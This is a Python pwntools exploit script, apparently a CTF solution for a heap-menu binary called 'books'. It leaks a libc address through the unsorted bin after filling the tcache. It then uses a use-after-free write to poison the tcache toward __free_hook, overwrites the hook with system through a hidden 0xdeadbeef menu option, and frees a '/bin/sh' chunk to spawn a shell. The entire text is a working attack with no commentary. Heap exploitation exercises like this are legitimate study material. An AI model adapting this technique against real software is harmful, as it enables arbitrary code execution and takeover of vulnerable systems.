#-*- coding:utf-8 -*-
from pwn import *
context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])
p = process('./books')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.sendlineafter('name? ', 'yuan')

def Buy(index, size, content):
    p.sendlineafter('Your choice: ', '1')
    p.sendlineafter('book? ', str(index))
    p.sendlineafter('content? ', str(size))
    p.sendafter('input your content: ', content)
    p.sendlineafter('want a receipt? [y/n] ', 'n')

def Sell(index):
    p.sendlineafter('Your choice: ', '2')
    p.sendlineafter('book? ', str(index))

def Write(index, content):
    p.sendlineafter('Your choice: ', '3')
    p.sendlineafter('book? ', str(index))
    p.sendafter('content: ', content)

def Read(index):
    p.sendlineafter('Your choice: ', '4')
    p.sendlineafter('book? ', str(index)) 

def Magic(data):
    p.sendlineafter('Your choice: ', str(0xdeadbeef))
    p.sendafter('Here is a magic place.\n', data)

for i in range(7):
    Buy(1, 0x230, 'AAAA\n')
    Sell(1)

Buy(2, 0x230, 'AAAAA\n')
Buy(3, 0x100, 'AAAA\n')
Sell(2)

Read(2)
p.recvuntil('content: ')
libc_base = u64(p.recv(6) + '\x00\x00') - 0x1ebbe0
info("libc_base ==> " + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']

Write(1, p64(free_hook) + '\x00\x00'*8 + '\n')
Buy(2, 0x100, '/bin/sh\x00\n')

Magic('AAAAA\n')
Magic(p64(system_addr))

Sell(2)

p.interactive()
